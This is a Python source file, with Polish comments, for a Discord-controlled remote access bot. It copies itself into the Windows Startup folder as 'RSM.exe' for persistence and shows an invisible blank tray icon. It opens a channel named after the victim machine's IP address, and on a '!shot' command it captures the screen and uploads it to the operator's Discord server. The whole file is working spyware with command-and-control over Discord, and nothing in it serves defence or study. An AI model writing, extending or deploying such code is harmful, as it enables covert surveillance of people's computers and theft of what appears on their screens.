import discord
from discord.ext import commands
import socket
import pyautogui
import io
import os
import shutil
import threading
from PIL import Image
import pystray

# ====== KONFIGURACJA ======
TOKEN = ""
GUILD_ID =
CATEGORY_ID =

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True 
bot = commands.Bot(command_prefix="!", intents=intents)

# ====== AUTOSTART ======
def add_to_startup():
    startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    src = os.path.abspath(__file__.replace(".py", ".exe"))
    dst = os.path.join(startup, "RSM.exe")
    if not os.path.exists(dst):
        try:
            shutil.copy(src, dst)
        except:
            pass

# ====== TRAY ======
def create_tray():
    image = Image.new('RGBA', (64, 64), (0, 0, 0, 0))
    menu = pystray.Menu(pystray.MenuItem('Exit', lambda: os._exit(0)))
    icon = pystray.Icon("bot", image, "RSM", menu)
    icon.run()

# ====== IP ======
def get_local_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
    except:
        return "unknown-ip"

# ====== KANAŁ ======
async def create_calc_channel(guild):
    ip = get_local_ip().replace(".", "-")
    name = f"calc-{ip}"
    category = discord.utils.get(guild.categories, id=CATEGORY_ID)
    if category is None:
        print("Nie znaleziono kategorii! Sprawdź CATEGORY_ID")
        return None
    existing = discord.utils.get(guild.text_channels, name=name)
    if existing:
        return existing
    channel = await guild.create_text_channel(name, category=category)
    return channel

# ====== READY ======
@bot.event
async def on_ready():
    print(f"Zalogowano jako {bot.user}!")
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("Nie mogę znaleźć serwera. Sprawdź GUILD_ID!")
        return
    calc_channel = await create_calc_channel(guild)
    if calc_channel:
        print(f"Stworzono kanał: {calc_channel.name}")
    else:
        print("Nie udało się stworzyć kanału.")

# ====== KOMENDA SCREEN ======
@bot.command(name="shot")
async def screenshot(ctx):
    image = pyautogui.screenshot()
    with io.BytesIO() as image_binary:
        image.save(image_binary, "PNG")
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename="screenshot.png"))

# ====== URUCHOMIENIE ======
if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=create_tray, daemon=True).start()
    bot.run(TOKEN)
